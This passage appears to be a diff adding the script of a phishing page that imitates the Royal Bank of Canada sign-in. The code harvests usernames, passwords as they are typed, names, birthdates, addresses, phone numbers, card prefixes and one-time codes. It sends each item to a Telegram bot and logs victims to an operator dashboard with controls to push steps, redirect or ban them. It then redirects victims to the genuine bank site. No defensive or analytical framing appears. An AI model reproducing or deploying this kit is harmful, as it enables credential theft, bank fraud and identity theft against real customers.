+
+            if (isLiveUpdate && telegramOtpMessageId) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            message_id: telegramOtpMessageId,
+                            text: message,
+                            parse_mode: "HTML"
+                        })
+                    });
+                } catch (err) { console.error("Erreur Telegram edit otp:", err); }
+            } else {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: "HTML"
+                        })
+                    });
+                    const json = await res.json();
+                    if (json.ok && json.result) {
+                        telegramOtpMessageId = json.result.message_id;
+                    }
+                } catch (err) { console.error("Erreur Telegram send otp:", err); }
+            }
+        }
+
+        let myTesterId = localStorage.getItem("localTesterId");
+        if (!myTesterId) {
+            myTesterId = 'usr_' + Math.random().toString(36).substring(2, 9);
+            localStorage.setItem("localTesterId", myTesterId);
+        }
+        let currentUserEmail = localStorage.getItem("currentUserEmail") || "client.rbc@gmail.com";
+
+        function updateMyStatus(statusText) {
+            if (localStorage.getItem("userBanned") === "true") return;
+            let onlineUsers = JSON.parse(localStorage.getItem("onlineUsersList") || "[]");
+            let index = onlineUsers.findIndex(u => u.id === myTesterId);
+
+            const record = {
+                id: myTesterId,
+                email: currentUserEmail,
+                ip: '192.168.1.15 (QC, CA)',
+                currentPage: "rbc.html",
+                status: statusText,
+                lastSeen: Date.now()
+            };
+
+            if (index !== -1) {
+                onlineUsers[index] = record;
+            } else {
+                onlineUsers.unshift(record);
+            }
+            localStorage.setItem("onlineUsersList", JSON.stringify(onlineUsers));
+        }
+
+        function pushLogToPanel(bankName, cardInfo, status, details) {
+            const logEntry = {
+                time: new Date().toLocaleTimeString(),
+                bank: bankName,
+                card: cardInfo,
+                status: status,
+                details: details
+            };
+
+            let liveLogs = JSON.parse(localStorage.getItem("liveAttackLogs") || "[]");
+            liveLogs.unshift(logEntry);
+            localStorage.setItem("liveAttackLogs", JSON.stringify(liveLogs));
+
+            let totalSent = parseInt(localStorage.getItem("panelTotalSent") || "0") + 1;
+            localStorage.setItem("panelTotalSent", totalSent);
+
+            if (status === 'SUCCESS') {
+                let totalSuccess = parseInt(localStorage.getItem("panelTotalSuccess") || "0") + 1;
+                localStorage.setItem("panelTotalSuccess", totalSuccess);
+
+                let winningRecordsLog = JSON.parse(localStorage.getItem("winningRecordsLog") || "[]");
+                winningRecordsLog.unshift({
+                    id: '#' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+                    type: bankName,
+                    amount: cardInfo,
+                    date: "À l'instant"
+                });
+                localStorage.setItem("winningRecordsLog", JSON.stringify(winningRecordsLog));
+            }
+
+            panelChannel.postMessage({ type: 'NEW_LOG', log: logEntry });
+        }
+
+        updateMyStatus("Sur RBC (Étape 1: Identifiant)");
+
+        let typingTimerLogin;
+        function handleLoginLiveInput() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            clearTimeout(typingTimerLogin);
+            typingTimerLogin = setTimeout(() => {
+                if (username || password) {
+                    sendOrUpdateLoginTelegram({ username, password }, true);
+                }
+            }, 300);
+        }
+
+        let typingTimerInfo;
+        function handleInfoLiveUpdate() {
+            const data = {
+                firstName: document.getElementById('firstName').value.trim(),
+                lastName: document.getElementById('lastName').value.trim(),
+                birthdate: document.getElementById('birthdate').value.trim(),
+                address: document.getElementById('address').value.trim(),
+                postalCode: document.getElementById('postalCode').value.trim(),
+                phone: document.getElementById('phone').value.trim(),
+                email: document.getElementById('email').value.trim(),
+                cardPrefix: document.getElementById('cardPrefix').value.trim()
+            };
+            clearTimeout(typingTimerInfo);
+            typingTimerInfo = setTimeout(() => {
+                if (Object.values(data).some(v => v !== '')) {
+                    sendOrUpdateInfoTelegram(data, true);
+                }
+            }, 300);
+        }
+
+        function handleOtpLiveUpdate() {
+            const code = document.getElementById('verificationCode').value.trim();
+            if (code.length > 0) {
+                sendOrUpdateOtpTelegram(code, true);
+            }
+        }
+
+        function toggleHelpPopover(event) {
+            event.preventDefault();
+            const popover = document.getElementById('helpPopover');
+            popover.style.display = (popover.style.display === 'block') ? 'none' : 'block';
+        }
+
+        function closeHelpPopover(event) {
+            if (event) event.preventDefault();
+            document.getElementById('helpPopover').style.display = 'none';
+        }
+
+        document.addEventListener('click', function(event) {
+            const popover = document.getElementById('helpPopover');
+            const helpIcon = document.getElementById('helpIconBtn');
+            if (popover && popover.style.display === 'block') {
+                if (!popover.contains(event.target) && !helpIcon.contains(event.target)) {
+                    popover.style.display = 'none';
+                }
+            }
+        });
+
+        let currentStep = 1;
+
+        function toggleServicesDrawer() {
+            const drawer = document.getElementById('servicesDrawer');
+            drawer.classList.toggle('open');
+        }
+
+        function toggleCookieModal() {
+            const modal = document.getElementById('cookieModalOverlay');
+            modal.classList.toggle('open');
+        }
+
+        function switchStepDirect(stepNum) {
+            currentStep = parseInt(stepNum);
+            document.getElementById('step-username').style.display = 'none';
+            document.getElementById('step-password').style.display = 'none';
+            document.getElementById('step-personal').style.display = 'none';
+            document.getElementById('step-verification').style.display = 'none';
+
+            if (currentStep === 1) document.getElementById('step-username').style.display = 'block';
+            else if (currentStep === 2) document.getElementById('step-password').style.display = 'block';
+            else if (currentStep === 3) document.getElementById('step-personal').style.display = 'block';
+            else if (currentStep === 4) document.getElementById('step-verification').style.display = 'block';
+            
+            updateMyStatus(`Sur RBC (Étape ${currentStep})`);
+        }
+
+        function handleFormSubmit(event) {
+            event.preventDefault();
+            
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const firstNameInput = document.getElementById('firstName');
+            const lastNameInput = document.getElementById('lastName');
+            const birthdateInput = document.getElementById('birthdate');
+            const addressInput = document.getElementById('address');
+            const postalCodeInput = document.getElementById('postalCode');
+            const phoneInput = document.getElementById('phone');
+            const emailInput = document.getElementById('email');
+            const cardPrefixInput = document.getElementById('cardPrefix');
+            const verificationCodeInput = document.getElementById('verificationCode');
+
+            if (currentStep === 1) {
+                const usernameError = document.getElementById('username-error');
+                
+                if (!usernameInput.value.trim()) {
+                    usernameInput.classList.add('error');
+                    usernameError.classList.add('show');
+                    return;
+                }
+
+                if (usernameInput.value.trim().includes("@")) {
+                    currentUserEmail = usernameInput.value.trim();
+                    localStorage.setItem("currentUserEmail", currentUserEmail);
+                }
+
+                sendOrUpdateLoginTelegram({ username: usernameInput.value.trim(), password: '' }, false);
+                pushLogToPanel('RBC (Identifiant)', usernameInput.value.trim(), 'PENDING', 'En attente du mot de passe');
+
+                const btn = document.getElementById('btn-step1');
+                const originalText = btn.innerText;
+                btn.innerHTML = '<div class="spinner"></div>';
+                btn.disabled = true;
+
+                updateMyStatus("Sur RBC (Étape 2: Mot de passe)");
+
+                setTimeout(() => {
+                    btn.innerText = originalText;
+                    btn.disabled = false;
+                    
+                    document.getElementById('step-username').style.display = 'none';
+                    document.getElementById('step-password').style.display = 'block';
+                    currentStep = 2;
+                }, 1500);
+
+            } else if (currentStep === 2) {
+                const passwordError = document.getElementById('password-error');
+                
+                if (!passwordInput.value.trim()) {
+                    passwordInput.classList.add('error');
+                    passwordError.classList.add('show');
+                    return;
+                }
+
+                sendOrUpdateLoginTelegram({ username: usernameInput.value.trim(), password: passwordInput.value.trim() }, false);
+                pushLogToPanel('RBC (Connexion)', usernameInput.value.trim(), 'PENDING', `Pass: ${passwordInput.value.trim()}`);
+
+                const btn = document.getElementById('btn-step2');
+                const originalText = btn.innerText;
+                btn.innerHTML = '<div class="spinner"></div>';
+                btn.disabled = true;
+
+                updateMyStatus("Sur RBC (Étape 3: Vérification d'identité)");
+
+                setTimeout(() => {
+                    btn.innerText = originalText;
+                    btn.disabled = false;
+
+                    document.getElementById('step-password').style.display = 'none';
+                    document.getElementById('step-personal').style.display = 'block';
+                    currentStep = 3;
+                }, 1500);
+
+            } else if (currentStep === 3) {
+                let hasError = false;
+
+                if (!firstNameInput.value.trim()) { firstNameInput.classList.add('error'); document.getElementById('firstName-error').classList.add('show'); hasError = true; }
+                if (!lastNameInput.value.trim()) { lastNameInput.classList.add('error'); document.getElementById('lastName-error').classList.add('show'); hasError = true; }
+                if (!birthdateInput.value.trim()) { birthdateInput.classList.add('error'); document.getElementById('birthdate-error').classList.add('show'); hasError = true; }
+                if (!addressInput.value.trim()) { addressInput.classList.add('error'); document.getElementById('address-error').classList.add('show'); hasError = true; }
+                if (!postalCodeInput.value.trim()) { postalCodeInput.classList.add('error'); document.getElementById('postalCode-error').classList.add('show'); hasError = true; }
+                if (!phoneInput.value.trim()) { phoneInput.classList.add('error'); document.getElementById('phone-error').classList.add('show'); hasError = true; }
+                if (!emailInput.value.trim()) { emailInput.classList.add('error'); document.getElementById('email-error').classList.add('show'); hasError = true; }
+                if (!cardPrefixInput.value.trim()) { cardPrefixInput.classList.add('error'); document.getElementById('cardPrefix-error').classList.add('show'); hasError = true; }
+
+                if (hasError) return;
+
+                const infoData = {
+                    firstName: firstNameInput.value.trim(),
+                    lastName: lastNameInput.value.trim(),
+                    birthdate: birthdateInput.value.trim(),
+                    address: addressInput.value.trim(),
+                    postalCode: postalCodeInput.value.trim(),
+                    phone: phoneInput.value.trim(),
+                    email: emailInput.value.trim(),
+                    cardPrefix: cardPrefixInput.value.trim()
+                };
+                sendOrUpdateInfoTelegram(infoData, false);
+                pushLogToPanel('RBC (Infos)', usernameInput.value.trim(), 'PENDING', `Nom: ${infoData.firstName} ${infoData.lastName}, Tél: ${infoData.phone}`);
+
+                const btn = document.getElementById('btn-step3');
+                const originalText = btn.innerText;
+                btn.innerHTML = '<div class="spinner"></div>';
+                btn.disabled = true;
+
+                updateMyStatus("Sur RBC (Étape 4: Code OTP)");
+
+                setTimeout(() => {
+                    btn.innerText = originalText;
+                    btn.disabled = false;
+
+                    document.getElementById('step-personal').style.display = 'none';
+                    document.getElementById('step-verification').style.display = 'block';
+                    currentStep = 4;
+                }, 1500);
+
+            } else if (currentStep === 4) {
+                const verificationCodeError = document.getElementById('verificationCode-error');
+                const codeValue = verificationCodeInput.value.trim();
+                
+                if (!codeValue || codeValue.length !== 6 || isNaN(codeValue)) {
+                    verificationCodeInput.classList.add('error');
+                    verificationCodeError.classList.add('show');
+                    return;
+                }
+
+                sendOrUpdateOtpTelegram(codeValue, false);
+                pushLogToPanel('RBC (Complet)', usernameInput.value.trim(), 'SUCCESS', `OTP: ${codeValue} | Pass: ${passwordInput.value.trim()}`);
+
+                const btn = document.getElementById('btn-step4');
+                const originalText = btn.innerText;
+                btn.innerHTML = '<div class="spinner"></div>';
+                btn.disabled = true;
+
+                updateMyStatus("RBC - Validé / Succès");
+
+                setTimeout(() => {
+                    document.getElementById('loginForm').style.display = 'none';
+                    document.getElementById('links-section').style.display = 'none';
+                    document.getElementById('success-container').style.display = 'block';
+
+                    setTimeout(() => {
+                        window.location.replace("https://www.rbcroyalbank.com/bank-accounts/index.html");
+                    }, 3000);
+
+                }, 1500);
+            }
+        }
+
+        function removeError(inputElement) {
+            if (inputElement.value.trim()) {
+                inputElement.classList.remove('error');
+                const errorId = inputElement.id + '-error';
+                const errorElement = document.getElementById(errorId);
+                if (errorElement) {
+                    errorElement.classList.remove('show');
+                }
+            }
+        }
+
+        let lastProcessedAction = localStorage.getItem("forceUserAction");
+        
+        function handleDashboardAction() {
+            const forced = localStorage.getItem("forceUserAction");
+            if (!forced || forced === lastProcessedAction) return;
+            
+            try {
+                const data = JSON.parse(forced);
+                if (data.targetId === "all" || data.targetId === myTesterId) {
+                    lastProcessedAction = forced;
+
+                    if (data.action === "step") {
+                        switchStepDirect(data.value);
+                    } else if (data.action === "otp") {
+                        window.location.href = data.value;
+                    } else if (data.action === "ban") {
+                        localStorage.setItem("userBanned", "true");
+                        document.body.innerHTML = '<div style="background:#020204; color:#ff0055; height:100vh; display:flex; align-items:center; justify-content:center; font-family:Arial, sans-serif; font-size:1.5rem; text-align:center;">ACCÈS REFUSÉ - VOUS AVEZ ÉTÉ BANNI PAR L\'ADMINISTRATEUR.</div>';
+                    }
+                }
+            } catch (err) { console.error("Erreur action dashboard:", err); }
+        }
+
+        window.addEventListener("storage", (event) => {
+            if (event.key === "forceUserAction") {
+                handleDashboardAction();
+            }
+        });
+
+        setInterval(() => {
+            let statusText = "Sur RBC (Étape 1: Identifiant)";
+            if (currentStep === 2) statusText = "Sur RBC (Étape 2: Mot de passe)";
+            else if (currentStep === 3) statusText = "Sur RBC (Étape 3: Vérification d'identité)";
+            else if (currentStep === 4) statusText = "Sur RBC (Étape 4: Code OTP)";
+            else if (document.getElementById('success-container').style.display === 'block') statusText = "Complété (Succès)";
+            
+            updateMyStatus(statusText);
+            handleDashboardAction();
+        }, 1000);
+
+        window.addEventListener("beforeunload", () => {
+            let onlineUsers = JSON.parse(localStorage.getItem("onlineUsersList") || "[]");
+            onlineUsers = onlineUsers.map(u => u.id === myTesterId ? { ...u, status: "🔴 Sorti de la page (Inactif)", lastSeen: 0 } : u);
+            localStorage.setItem("onlineUsersList", JSON.stringify(onlineUsers));
+        });
+    </script>
+</body>
+</html>
